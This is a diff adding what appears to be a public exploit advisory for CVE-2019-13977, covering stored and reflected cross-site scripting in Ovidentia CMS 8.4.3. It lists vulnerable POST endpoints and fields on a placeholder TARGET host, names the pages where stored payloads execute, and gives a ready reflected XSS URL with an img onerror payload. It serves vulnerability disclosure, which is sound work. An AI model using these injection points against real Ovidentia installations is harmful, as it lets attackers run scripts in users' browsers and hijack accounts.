@@ -1,0 +1,74 @@
+#-------------------------------------------------------
+# Exploit Title: [ Ovidentia CMS - XSS Ovidentia 8.4.3 ]
+# Description: [ The vulnerability permits any kind of XSS attacks. Reflected, DOM and Stored XSS. ]
+# Date: [ 06/05/2019 ]
+# CVE: [ CVE-2019-13977 ]
+# Exploit Author:
+#     [ Fernando Pinheiro (n3k00n3) ]
+#     [ Victor Flores	(UserX) ]
+# Vendor Homepage: [
+https://www.ovidentia.org/
+]
+# Version: [ 8.4.3 ]
+# Tested on: [ Mac,linux - Firefox, safari ]
+# Download: [
+http://en.ovidentia.org/index.php?tg=fileman&sAction=getFile&id=17&gr=Y&path=Downloads%2FDistributions&file=ovidentia-8-4-3.zip&idf=893
+]
+#
+#           [ Kitsun3Sec Research Group ]
+#--------------------------------------------------------
+
+POC
+
+>========================================================
+                      Stored XSS
+>========================================================
+
+1. POST
+http://TARGET/ovidentia/index.php?tg=groups
+Field:
+		nom
+2. POST
+http://TARGET/ovidentia/index.php?tg=maildoms&idx=create&userid=0&bgrp=y
+Fields:
+		Nom
+		Description
+3. GET
+http://TARGET/ovidentia/index.php?tg=delegat
+Show groups
+4. POST
+http://TARGET/ovidentia/index.php?tg=site&idx=create
+
+http://TARGET/ovidentia/index.php?tg=site&item=4
+Fields:
+		Nom
+		address
+		description
+5. POST
+http://TARGET/ovidentia/index.php?tg=admdir&idx=mdb&id=1
+Fields:
+		Libellé du champ
+	Explosion:
+http://TARGET/ovidentia/index.php?tg=forums&idx=notices
+
+http://TARGET/ovidentia/index.php?tg=admdir&idx=dispdb&id=1
+
+http://TARGET/ovidentia/index.php?tg=admdir&idx=lorddb&id=1
+6. POST
+http://TARGET/ovidentia/index.php?tg=notes&idx=Create
+Fields: Notes
+	Explosion:
+http://TARGET/ovidentia/index.php?tg=notes&idx=List
+7. POST
+http://TARGET/ovidentia/index.php?tg=admfaqs&idx=Add
+Fields: all
+	Explosion:
+http://TARGET/ovidentia/index.php?tg=admfaqs&idx=Categories#bab_faq_2
+>========================================================
+                    REFLECTED
+>========================================================
+
+1. GET
+http://TARGET/ovidentia/index.php?tg=admoc&idx=addoc&item=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
+
+Sent from [ProtonMail](https://protonmail.com), encrypted email based in Switzerland.
